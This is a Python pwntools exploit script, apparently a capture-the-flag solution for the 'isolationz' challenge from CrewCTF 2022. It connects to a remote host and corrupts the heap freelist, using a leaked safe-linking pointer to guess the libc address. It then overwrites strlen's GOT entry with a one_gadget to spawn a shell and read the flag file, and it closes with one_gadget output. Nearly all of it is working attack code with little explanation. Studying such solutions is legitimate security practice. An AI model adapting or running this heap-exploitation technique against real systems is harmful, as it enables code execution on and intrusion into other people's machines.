#!/usr/bin/env python3

from pwn import *
import re

context.aslr = True
context.arch = 'x86_64'
context.log_level = 'info'
warnings.filterwarnings(action='ignore')
context.terminal = ['/home/xion/vscode-terminal']

def add(size, data,):
    p.sendlineafter(">> ", "1")
    p.sendlineafter(": ", str(size))
    p.sendlineafter(": ", data)
def delete(index):
    p.sendlineafter(">> ", "2")
    p.sendlineafter(": ", str(index))
def show():
    p.sendlineafter(">> ", "3")
    o = []
    while True:
        l = p.recvline()
        r = re.findall(b"(.+) = (\d+\.\d+)", l)
        if not r: break
        o.append(r[0])
    return o

# ptr2 = ptr1 + offset
# enc = (ptr1 >> 12) ^ ptr2
def calc(enc, ptr1_suff, ptr2_suff, offset):
    ptr1_suff = ptr1_suff & 0xfff
    ptr2_suff = ptr2_suff & 0xfff
    ptr1 = ptr1_suff
    ptr2 = ptr2_suff
    for shift in range(0, 24, 12):
        ptr1_nxt = ((enc >> shift) ^ (ptr2 >> shift)) & 0xfff
        ptr1 += ptr1_nxt << (shift + 12)
        ptr2 = (ptr1 + offset) & ((1 << (shift + 24 + 1)) - 1)
    return ptr1, ptr2

libc = ELF('./libc.so.6')

'''
Analysis

Insert:
chunk->fd = head->fd
chunk->bk = head
head->fd->bk = chunk
head->fd = chunk
<=>
 <- fd    bk ->
A <-> head <-> B  ==>  A <-> chunk = head <-> old_head <-> B

Iteration: always head, head->bk, ...
'''

for ctr in range(1<<64):
    log.info(f'try #{ctr}')
    #p = process(['./chall'])
    p = remote('isolationz.crewctf-2022.crewc.tf', 1337)

    try:
        add(0x10, '0')  # 0
        add(0x10, '0')  # 1
        add(0x10, '0')  # 2
        add(0x10, '1')  # 3
        add(0x10, '0')  # 4
        add(0x10, '0')  # 5
        add(0x40, '0')  # 6
        add(0x20, '0')  # 7
        delete(0)  # 1 2 3 4 5 6 7
        delete(6)  # 1 2 3 4 5 7
        add(0x38, '2')  # 0 => 0 1 2 3 4 5 7
        
        leak = show()[-1][0]
        assert len(leak) == 3
        enc = u64(leak.ljust(8, b'\0'))
        ofs = 0x0
        r = calc(enc, ofs, ofs, 0)[0]
        addr_mmap = 0x7fc000000000 | (r - ofs) # 0x7fX --> 1/16 probability
        
        chunk = addr_mmap + ofs
        assert ((chunk >> 12) ^ chunk) & 0b111 == 0b111

        log.success(f'{addr_mmap    = :#014x}')
        libc.address = addr_mmap + 0x4000
        log.success(f'{libc.address = :#014x} (guess 0x7f?)')

        delete(2)  # 0 1 3 4 5 7
        delete(7)  # 0 1 3 4 5

        # Freelist: fill#0 <-> fake chunk = head <-> fill#2 <-> overwrite <-> fill#0

        show()

        one_gadget = libc.address + 0xeacf2

        #gdb.attach(p)
        #input('>')

        add(libc.address + 0x219098 - (addr_mmap + 0x140), b"1337\0\n")  # offset to strlen@got of libc
        #input('>')
        add(0x40, b"0".ljust(0x10, b'\0') + p64(one_gadget) + b'\n')
        #input('>')

        p.sendline('\n\necho yeet')
        p.recvuntil('yeet')

        p.sendline('cat fl*; cat /fl*')

        p.interactive()

        break

    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(e)
        continue
    finally:
        try:
            p.close()
        except:
            pass

'''
$ one_gadget ./libc.so.6
0xeacec execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xeacef execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xeacf2 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''
